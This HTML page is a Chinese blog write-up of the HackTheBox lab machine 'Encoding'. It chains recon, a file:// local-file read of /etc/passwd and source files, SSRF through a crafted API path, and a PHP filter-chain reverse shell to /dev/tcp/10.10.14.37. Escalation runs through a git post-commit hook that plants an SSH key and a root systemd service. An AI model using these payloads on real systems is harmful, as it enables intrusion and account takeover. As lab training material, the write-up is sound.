@@ -1,0 +1,539 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title> HTB：Encoding | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title"> HTB：Encoding</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2023-04-23</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
+                    靶场
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
+                    刷题
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
+                    HTB
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <p>标签：api, php, .git, ssrf, lfi to rce,post-commit hook,service</p>
+<p>………慢慢来，不要着急。打退役box积攒经验中…</p>
+<h2 id="recon">Recon</h2>
+<p>探索了下页面，又看了下标题其实感觉主要是页面内提供Encoding功能的API，不过这个只是猜测</p>
+<p><strong>端口扫描</strong></p>
+<p>端口扫描没收获也大概证实了一下这个猜想（？ 只有 <code>80</code>, <code>22</code></p>
+<p><strong>目录爆破</strong></p>
+<p>用feroxbuster</p>
+<pre><code class="language-json">[####################] - 10m    60021/60021   0s      found:8       errors:633    
+[####################] - 10m    30000/30000   47/s    http://10.10.11.198/ 
+[####################] - 7m     30000/30000   64/s    http://10.10.11.198/includes/ 
+[####################] - 1s     30000/30000   0/s     http://10.10.11.198/assets/js/ =&gt; Directory listing
+[####################] - 1s     30000/30000   0/s     http://10.10.11.198/assets/ =&gt; Directory listing
+[####################] - 0s     30000/30000   0/s     http://10.10.11.198/assets/img/ =&gt; Directory listing
+[####################] - 0s     30000/30000   0/s     http://10.10.11.198/assets/css/ =&gt; Directory listing
+</code></pre>
+<p><strong>子域名扫描</strong></p>
+<p><code>wfuzz -c -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u [http://haxtables.htb](http://haxtables.htb/) -H &quot;Host:FUZZ.haxtables.htb&quot; --hc 302,400,404 --hw 137</code></p>
+<p>这里前期发现会有误报，所以需要加一个 <code>--hw 137</code>的选项</p>
+<pre><code class="language-php">=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                     
+=====================================================================
+
+000000051:   200        0 L      0 W        0 Ch        &quot;api&quot;                                                                                                                                                                                       
+000000177:   403        9 L      28 W       284 Ch      &quot;image&quot;
+</code></pre>
+<p><strong>网站探索</strong></p>
+<p>页面探索了以下，功能点的路径如下，(请求体下的 <code>uri_path</code> 为对应的api地址，感觉后续可以利用)：</p>
+<pre><code class="language-bash">http://10.10.11.198/handler.php
+</code></pre>
+<p>然后是涉及api的子域名（相关介绍在http://10.10.11.198/index.php?page=api）：</p>
+<pre><code class="language-bash">http://api.haxtables.htb/
+</code></pre>
+<p>记得将上述提到的域名添加到hosts文件中</p>
+<h2 id="api">API</h2>
+<h3 id="文档阅读">文档阅读</h3>
+<p>文档里写的是 <code>POST</code> 请求：</p>
+<ul>
+<li>string类型：<code>http://api.haxtables.htb/v3/tools/string/index.php</code></li>
+<li>int类型： <code>http://api.haxtables.htb/v3/tools/integer/index.php</code></li>
+</ul>
+<p>此外，string和int除了支持json构造请求体（如下）：</p>
+<pre><code class="language-json">json_data = {
+        'action': 'dec2bin,
+        'data': 'str or int',
+    }
+</code></pre>
+<p>还支持指定本地文件or文件url的形式对文件进行转换</p>
+<p>文件上传的功能测试</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423.png" alt="20230423" loading="lazy"></figure>
+<h3 id="目录爆破">目录爆破</h3>
+<p><code>feroxbuster -u [http://api.haxtables.htb](http://api.haxtables.htb/) -x php -m GET,POST</code></p>
+<pre><code class="language-json">[####################] - 30m   420066/420066  0s      found:45      errors:20056  
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/ 
+[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v2/ =&gt; Directory listing
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v2/tools/ 
+[####################] - 0s     60000/60000   0/s     http://api.haxtables.htb/v3/ =&gt; Directory listing
+[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v3/tools/ =&gt; Directory listing
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v3/tools/integer/ 
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v3/tools/string/ 
+[####################] - 0s     60000/60000   0/s     http://api.haxtables.htb/v1/ =&gt; Directory listing
+[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v1/tools/ =&gt; Directory listing
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v1/tools/string/ 
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v1/tools/integer/ 
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v2/tools/string/
+</code></pre>
+<p>除了版本不同，功能点是一样得差不多</p>
+<h2 id="source-code-git">source-code &amp; git</h2>
+<h3 id="源代码阅读">源代码阅读</h3>
+<p>尝试指定文件路径进行encoding的功能点，构造对应的exp：</p>
+<pre><code class="language-python">import requests
+
+def get_file(file):
+    data = {
+        'action': 'str2hex',
+        'file_url': f&quot;file://{file}&quot;
+    }
+    http_proxy = {'http': 'http://127.0.0.1:8080'}
+    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=data,proxies=http_proxy)
+    return response.json()[&quot;data&quot;]
+
+def hex2str(data):
+    json_data = {
+    'action': 'hex2str',
+    'data': f'{data}',
+    }
+    http_proxy = {'http': 'http://127.0.0.1:8080'}
+    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data,proxies=http_proxy)
+    print(response.json()[&quot;data&quot;])
+
+file = &quot;/etc/passwd&quot;    # 改成对应地址
+data = get_file(file)
+hex2str(data)
+</code></pre>
+<p>可以获取到</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_1.png" alt="20230423" loading="lazy"></figure>
+<p>稍微改写了一下，遍历然后输出</p>
+<pre><code class="language-python">files = [&quot;/etc/passwd&quot;, &quot;/var/www/html/index.php&quot;,&quot;/var/www/html/handler.php&quot;]
+for file in files:
+    data = get_file(file)
+    file_content = hex2str(data)
+    file_name = file.split('/')[-1]
+    print(file_name)
+    with open(f'{file_name}', 'a') as f:
+        f.write(file_content)
+</code></pre>
+<p>然后看 <code>handler.php</code> 下的内容</p>
+<pre><code class="language-python">&lt;?php
+include_once '../api/utils.php';
+
+if (isset($_FILES['data_file'])) {
+    $is_file = true;
+    $action = $_POST['action'];
+    $uri_path = $_POST['uri_path'];
+    $data = $_FILES['data_file']['tmp_name'];
+
+} else {
+    $is_file = false;
+    $jsondata = json_decode(file_get_contents('php://input'), true);
+    $action = $jsondata['action'];
+    $data = $jsondata['data'];
+    $uri_path = $jsondata['uri_path'];
+
+    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
+    {
+        echo jsonify(['message' =&gt; 'Insufficient parameters!']);
+        // echo jsonify(['message' =&gt; file_get_contents('php://input')]);
+
+    }
+
+}
+
+$response = make_api_call($action, $data, $uri_path, $is_file);
+echo $response;
+
+?&gt;
+</code></pre>
+<p>提取 <code>../api/utils.php</code> 的内容,</p>
+<pre><code class="language-php">&lt;?php
+
+// Global functions
+
+function jsonify($body, $code = null)
+{
+    if ($code) {
+        http_response_code($code);
+    }
+
+    header('Content-Type: application/json; charset=utf-8');
+    echo json_encode($body);
+
+    exit;
+}
+
+function get_included_contents($filename) {
+    ob_start();
+    include $filename;
+    return ob_get_clean();
+}
+
+function get_url_content($url){
+    $domain = parse_url($url, PHP_URL_HOST);
+    if (gethostbyname($domain) === &quot;127.0.0.1&quot;) {
+	jsonify([&quot;message&quot; =&gt; &quot;Unacceptable URL&quot;]);
+    }
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
+    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+    $url_content =  curl_exec($ch);
+    curl_close($ch);
+    return $url_content;
+}
+
+function make_api_call($action, $data, $uri_path, $is_file = false){
+    if ($is_file) {
+        $post = [
+            'data' =&gt; file_get_contents($data),
+            'action' =&gt; $action,
+            'uri_path' =&gt; $uri_path
+        ];
+    } else {
+        $post = [
+            'data' =&gt; $data,
+            'action' =&gt; $action,
+            'uri_path' =&gt; $uri_path
+        ];
+    }
+    
+    $ch = curl_init();
+    $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
+    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
+    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
+    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+    
+    
+}
+
+?&gt;
+</code></pre>
+<p>在这里 <code>gethostbyname($domain) === &quot;127.0.0.1&quot;</code> 用于判断给出的 <code>$domain</code> 是否指向本地</p>
+<p>访问 <code>image.haxtables.htb</code> 是403,然后试着用刚刚写的那个py去看下 <code>/var/www/image/index.php</code></p>
+<pre><code class="language-php">&lt;?php 
+
+include_once 'utils.php';
+
+include 'includes/coming_soon.html';
+
+?&gt;
+</code></pre>
+<p>看了一下comming_soon.html也没什么东西，但是 <code>utils.php</code> 里看到了关键得内容</p>
+<pre><code class="language-php">function git_status()
+{
+    $status = shell_exec('cd /var/www/image &amp;&amp; /usr/bin/git status');
+    return $status;
+}
+
+function git_log($file)
+{
+    $log = shell_exec('cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &quot;' . addslashes($file) . '&quot;');
+    return $log;
+}
+
+function git_commit()
+{
+    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
+    return $commit;
+}
+</code></pre>
+<h3 id="git">.git</h3>
+<p>在 <code>[git-commit.sh](http://git-commit.sh)</code> 下看到了 <code>/var/www/image/.git</code></p>
+<p>这里用git-dumper有点麻烦是，得本地提供一个服务去获取远程主机的。这里我用FastAPI～ 起到一个反向代理的作用。参考了：<a href="https://github.com/tiangolo/fastapi/issues/1788">https://github.com/tiangolo/fastapi/issues/1788</a> 下的方案写出的。本来以为FastAPI对于写API来说会比较方便，实现了这个却发现或许Flask会好点。</p>
+<p>这里新建了一个proxy.py</p>
+<pre><code class="language-python">import requests
+from fastapi import FastAPI, Response, Request
+from requests import get
+import httpx
+import json
+import binascii
+
+app = FastAPI()
+
+@app.get('/{path:path}')
+async def get_file(request: Request, response: Response):
+    path = request.url.path[1:]
+    print(path)
+    send_uri = 'http://api.haxtables.htb/v3/tools/string/index.php'
+    data = {
+        'action': 'str2hex',
+        'file_url': f&quot;file:///{path}&quot;
+    }
+    async with httpx.AsyncClient() as client:
+        proxy = await client.post('http://api.haxtables.htb/v3/tools/string/index.php', json=data)
+    body = binascii.unhexlify(json.loads(proxy.content)['data'])
+    response.body = body
+    response.status_code = proxy.status_code
+    return response
+</code></pre>
+<p>然后用 <code>uvicorn</code> 命令 <code>uvicorn proxy:app --reload</code> 此时反向代理的服务提供在8000</p>
+<p>然后使用 <code>git-dumper</code> 去获取对应的git仓库的内容：</p>
+<p><code>git-dumper [http://127.0.0.1:8000/var/www/image/.git](http://127.0.0.1:8000/var/www/image/.git) git-dumper/</code></p>
+<p>探索目录，目前为止发现比较有用的就是 <code>action_handler.php</code> 下的内容：</p>
+<pre><code class="language-python">&lt;?php
+
+include_once 'utils.php';
+
+if (isset($_GET['page'])) {
+    $page = $_GET['page'];
+    include($page);
+
+} else {
+    echo jsonify(['message' =&gt; 'No page specified!']);
+}
+
+?&gt;
+</code></pre>
+<p>访问对应的url地址： <code>http://image.haxtables.htb/actions/action_handler.php</code> 发现是403</p>
+<h2 id="uri">URI</h2>
+<h3 id="构造-handlerphp请求">构造 handler.php请求</h3>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_2.png" alt="20230423" loading="lazy"></figure>
+<p>根据URI的结构，刚刚<code>../api/utils.php</code> 的代码下的函数 <code>make_api_call</code> 的内容：</p>
+<pre><code class="language-python"> $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
+</code></pre>
+<p>可以通过构造 <code>$uri_path</code> 的格式为 <code>@&lt;ip&gt;#</code> 来使服务器请求发送至 <code>&lt;ip&gt;</code> 而不是前者</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_3.png" alt="20230423" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_4.png" alt="20230423" loading="lazy"></figure>
+<h3 id="构造poc">构造poc</h3>
+<p>用 https://github.com/synacktiv/php_filter_chain_generator 来构造..（备注：留坑，自己完了康康代码实现吧）</p>
+<pre><code class="language-python">python php_filter_chain_generator.py  --chain '&lt;?php system(&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.37/2333 0&gt;&amp;1 \&quot;&quot;); ?&gt;'
+</code></pre>
+<p>然后在 <a href="http://10.10.11.198/handler.php"><code>http://10.10.11.198/handler.php</code></a> 上发起请求，其中 <code>@image.haxtables.htb/actions/action_handler.php?page=</code> page后参数为生成的poc，这里是任意文件包含的入口点</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_5.png" alt="20230423" loading="lazy"></figure>
+<h2 id="shell-as-www-data">shell as www-data</h2>
+<p>nc连上后还是按照惯例进行upgrade shell</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_6.png" alt="20230423" loading="lazy"></figure>
+<p>然后 <code>sudo -l</code> 查看权限</p>
+<pre><code class="language-python">www-data@encoding:~$ sudo -l 
+sudo -l
+Matching Defaults entries for www-data on encoding:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on encoding:
+    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
+</code></pre>
+<h3 id="git-commitsh">git-commit.sh</h3>
+<p>看 <code>[git-commit.sh](http://git-commit.sh)</code> 的内容</p>
+<pre><code class="language-python">#!/bin/bash
+
+u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)
+
+if [[ $u ]]; then
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
+else
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m &quot;Commited from API!&quot; --author=&quot;james &lt;james@haxtables.htb&gt;&quot;  --no-verify
+fi
+</code></pre>
+<p>阅读这段代码，第一行前面是指定各种路径的参数。参考<a href="https://git-scm.com/docs/git-ls-files">https://git-scm.com/docs/git-ls-files</a>， <code>ls-files -o</code> 则是列出untracked的路径和文件列表。整体阅读，即新变动的代码会自动add，否则commit</p>
+<p>看对应的 <code>/var/www/image</code> 目录：</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_7.png" alt="20230423" loading="lazy"></figure>
+<p>这里 <code>x+</code> 表示有扩展属性。用getfacl命令查看：</p>
+<pre><code class="language-python">user::rwx
+user:www-data:rwx
+group::r-x
+mask::rwx
+other::r-x
+</code></pre>
+<p>但除了 <code>.git</code> 目录外，就没有其他可写入的地方了，但git-commit.sh 却支持我们add以及commit.这里试图用git来做一些绕过。这里有两种方法，一种是hook的方法(<a href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90">https://git-scm.com/book/zh/v2/自定义-Git-Git-钩子</a>)， 一种是attribute的方法（<a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes">https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes</a> 用了filter指定可执行文件）。这里我先用hook的方法。</p>
+<h2 id="user-flagpost-commit-hook">User Flag：post-commit hook</h2>
+<p>这里我们用post-commit</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_8.png" alt="20230423" loading="lazy"></figure>
+<ol>
+<li>在 <code>/tmp</code> 目录下用ssh-keygen新生成一对 <code>ssh-keygen -t ed25519 -f htb  -C &quot;me@htb&quot;</code></li>
+<li>新增一个hook（记得给post-commit修改对应权限 <code>chmod +x .git/hooks/post-commit</code>）</li>
+</ol>
+<pre><code class="language-python">echo -e 'mkdir -p /home/svc/.ssh\necho &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILLhHmaOAjmhtwqsT4hfOlcO1WiZFYbyoAAxsYb+EzkV me@htb&quot; &gt;&gt; /home/svc/.ssh/authorized_keys\nchmod 600 /home/svc/.ssh/authorized_keys' | tee .git/hooks/post-commit
+</code></pre>
+<ol>
+<li>制造触发post-commit条件：创建一个文件变动。这里用： <code>git --work-tree /tm个p/ add /tmp/qwe</code></li>
+<li>用svc用户身份执行命令，触发post-commit： <code>sudo -u svc /var/www/image/scripts/git-commit.sh</code></li>
+<li><code>ssh -i /tmp/htb svc@haxtables.htb</code>  拿到user flag</li>
+</ol>
+<h2 id="root-flag">Root Flag</h2>
+<p>查看已有权限：</p>
+<pre><code class="language-python">svc@encoding:~$ sudo -l
+sudo -l
+Matching Defaults entries for svc on encoding:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on encoding:
+    (root) NOPASSWD: /usr/bin/systemctl restart 
+</code></pre>
+<p>参考<a href="https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740">https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740</a> 写对应的service</p>
+<p>先确认能否在 <code>/etc/systemd/system</code> 下写服务，用 <code>getfacl</code> 命令确认只有写执行。然后写个service，用root身份执行就是。</p>
+<h2 id="reference">Reference：</h2>
+<ul>
+<li><a href="https://github.com/tiangolo/fastapi/issues/1788">https://github.com/tiangolo/fastapi/issues/1788</a></li>
+<li><a href="https://0xdf.gitlab.io/2023/04/15/htb-encoding.html#ssrf-in-haxtableshtb">https://0xdf.gitlab.io/2023/04/15/htb-encoding.html#ssrf-in-haxtableshtb</a></li>
+<li><a href="https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740">https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740</a></li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/synfony-rce-fen-xi/">
+              <h3 class="post-title">
+                下一篇：Symfony RCE 分析
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
